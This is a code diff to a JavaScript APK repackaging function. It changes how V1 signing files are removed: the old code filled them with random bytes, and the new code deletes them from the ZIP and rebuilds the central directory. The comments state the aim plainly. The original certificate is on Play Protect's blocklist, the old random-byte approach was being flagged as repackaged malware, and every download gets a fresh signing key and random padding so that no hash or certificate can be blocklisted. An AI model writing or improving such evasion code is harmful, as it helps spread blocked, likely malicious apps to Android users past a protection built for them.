@@ -1802,61 +1802,89 @@ function directPatchApk(originalBuffer) {
     const section4 = Buffer.from(buf.slice(eocdOff));
     section4.writeUInt32LE(newSection1.length, 16);
 
-    // ─── Step 8.5: Wipe V1 signing files (burned FIXED cert removal) ───
-    // The source APK (from mutateAndSign) contains V1 signing files:
-    //   META-INF/MANIFEST.MF, META-INF/{CERT|SIGNING|etc}.SF, META-INF/{PREFIX}.RSA
-    // These embed the FIXED cert's DER which is in Play Protect's cloud blocklist.
-    // PP reads V1 certs for identification EVEN when V2 signature is present.
-    // Fix: overwrite V1 file data with random bytes → destroys the burned cert
-    // fingerprint. V1 signature becomes invalid but V2 takes precedence (Android 7+).
-    let v1Wiped = 0;
-    for (const v1 of v1Entries) {
-      // Adjust local offset for manifest size delta
-      let adjustedLocalOff = v1.localOff;
-      if (v1.localOff > manifestLocalOff && sizeDelta !== 0) {
-        adjustedLocalOff += sizeDelta;
+    // ─── Step 8.5: Strip V1 signing entries ENTIRELY from ZIP ───
+    // The source APK contains V1 signing files (MANIFEST.MF, *.SF, *.RSA) with the
+    // burned FIXED cert. Previously we filled them with random garbage, but that's
+    // a MASSIVE tampering signal — PP's heuristic detects corrupted V1 data as
+    // repackaged malware and instant-blocks without scanning.
+    //
+    // Fix: Remove V1 entries from the ZIP entirely. A V2-only APK is standard for
+    // Android 7+ targets (our min is 8.0). No V1 files = no tampering evidence,
+    // no burned cert, and PP treats it like a modern build-tool output.
+    let finalS1 = newSection1;
+    let finalCD = section3;
+    let finalEOCD = section4;
+    let finalCDCount = cdCount;
+
+    if (v1Entries.length > 0) {
+      // Calculate adjusted local offsets for V1 entries (accounting for manifest size delta)
+      const v1Ranges = v1Entries.map(v1 => {
+        let adjOff = v1.localOff;
+        if (v1.localOff > manifestLocalOff && sizeDelta !== 0) adjOff += sizeDelta;
+        const lfhNameLen = newSection1.readUInt16LE(adjOff + 26);
+        const lfhExtraLen = newSection1.readUInt16LE(adjOff + 28);
+        return { start: adjOff, size: 30 + lfhNameLen + lfhExtraLen + v1.compSize, name: v1.name, cdPos: v1.cdPos };
+      }).sort((a, b) => a.start - b.start);
+
+      // Build Section 1 without V1 local file entries
+      const s1Chunks = [];
+      let cursor = 0;
+      const shiftPoints = []; // cumulative bytes removed at each cut point
+      let totalRemoved = 0;
+      for (const range of v1Ranges) {
+        if (range.start > cursor) s1Chunks.push(newSection1.slice(cursor, range.start));
+        totalRemoved += range.size;
+        shiftPoints.push({ at: range.start, cumulative: totalRemoved });
+        cursor = range.start + range.size;
       }
-      // Find data offset in newSection1
-      if (adjustedLocalOff + 30 > newSection1.length) continue;
-      const v1NameLen = newSection1.readUInt16LE(adjustedLocalOff + 26);
-      const v1ExtraLen = newSection1.readUInt16LE(adjustedLocalOff + 28);
-      const v1DataOff = adjustedLocalOff + 30 + v1NameLen + v1ExtraLen;
-      const v1CompSize = v1.compSize;
-      if (v1DataOff + v1CompSize > newSection1.length) continue;
+      if (cursor < newSection1.length) s1Chunks.push(newSection1.slice(cursor));
+      finalS1 = Buffer.concat(s1Chunks);
 
-      // Overwrite data with random bytes (same size → no offset changes)
-      crypto.randomFillSync(newSection1, v1DataOff, v1CompSize);
+      // Rebuild Central Directory without V1 entries, with adjusted local offsets
+      const v1CDSet = new Set(v1Entries.map(v => v.cdPos));
+      const cdEntryBufs = [];
+      let cdScan = 0;
+      for (let i = 0; i < cdCount; i++) {
+        if (cdScan + 46 > section3.length) break;
+        if (section3.readUInt32LE(cdScan) !== 0x02014b50) break;
+        const nl = section3.readUInt16LE(cdScan + 28);
+        const el = section3.readUInt16LE(cdScan + 30);
+        const cl = section3.readUInt16LE(cdScan + 32);
+        const entryLen = 46 + nl + el + cl;
+        const absCDPos = cdOff + cdScan;
 
-      // Update CRC32 in local file header (offset+14 = CRC field)
-      // For STORED entries: CRC is of the data itself. For DEFLATED: CRC is of uncompressed.
-      // Since we're just wiping (not caring about decompression), use CRC of the random bytes.
-      const randomData = newSection1.slice(v1DataOff, v1DataOff + v1CompSize);
-      const newV1CRC = computeCRC32(randomData);
-      newSection1.writeUInt32LE(newV1CRC, adjustedLocalOff + 14);
-      // Also update compressed/uncompressed sizes to match (treat as STORED)
-      newSection1.writeUInt16LE(0, adjustedLocalOff + 8); // method = STORED
-      newSection1.writeUInt32LE(v1CompSize, adjustedLocalOff + 18); // compressed size
-      newSection1.writeUInt32LE(v1CompSize, adjustedLocalOff + 22); // uncompressed size
-
-      // Update CRC + sizes in Central Directory
-      const v1CDRelPos = v1.cdPos - cdOff;
-      if (v1CDRelPos + 46 <= section3.length) {
-        section3.writeUInt32LE(newV1CRC, v1CDRelPos + 16);
-        section3.writeUInt16LE(0, v1CDRelPos + 10); // method = STORED
-        section3.writeUInt32LE(v1CompSize, v1CDRelPos + 20); // compressed size
-        section3.writeUInt32LE(v1CompSize, v1CDRelPos + 24); // uncompressed size
+        if (!v1CDSet.has(absCDPos)) {
+          const cdEntry = Buffer.from(section3.slice(cdScan, cdScan + entryLen));
+          // Adjust local file offset: subtract bytes removed before this position
+          const origOff = cdEntry.readUInt32LE(42);
+          let adj = 0;
+          for (const sp of shiftPoints) {
+            if (origOff > sp.at) adj = sp.cumulative;
+          }
+          cdEntry.writeUInt32LE(origOff - adj, 42);
+          cdEntryBufs.push(cdEntry);
+        }
+        cdScan += entryLen;
       }
+      finalCD = Buffer.concat(cdEntryBufs);
+      finalCDCount = cdEntryBufs.length;
 
-      v1Wiped++;
-      console.log(`[DirectPatch] Wiped V1 file: ${v1.name} (${v1CompSize}B → random)`);
+      // Update EOCD
+      finalEOCD = Buffer.from(section4);
+      finalEOCD.writeUInt16LE(finalCDCount, 8);          // entries on this disk
+      finalEOCD.writeUInt16LE(finalCDCount, 10);         // total entries
+      finalEOCD.writeUInt32LE(finalCD.length, 12);        // CD size
+      finalEOCD.writeUInt32LE(finalS1.length, 16);        // CD offset
+
+      console.log(`[DirectPatch] Stripped ${v1Ranges.length} V1 entries (${totalRemoved}B). Entries: ${cdCount} → ${finalCDCount}. V2-only APK.`);
+      for (const r of v1Ranges) console.log(`  → removed ${r.name} (${r.size}B)`);
     }
-    if (v1Wiped > 0) console.log(`[DirectPatch] Destroyed ${v1Wiped} V1 signing files (burned cert removed)`);
 
     // ─── Step 9: Zipalign + V2 sign with FRESH key + random entropy ───
     // Fresh key: unique cert fingerprint per download → can't be cert-blocklisted
     // Random entropy: padding pair in signing block → unique APK hash per download
     const key = generateFreshKey();
-    const unsignedApk = Buffer.concat([newSection1, section3, section4]);
+    const unsignedApk = Buffer.concat([finalS1, finalCD, finalEOCD]);
     const alignedApk = zipalignBuffer(unsignedApk);
     const signedBuf = applyV2SigningClean(alignedApk, key.privPem, key.certDer, key.pubKeyDer);
 
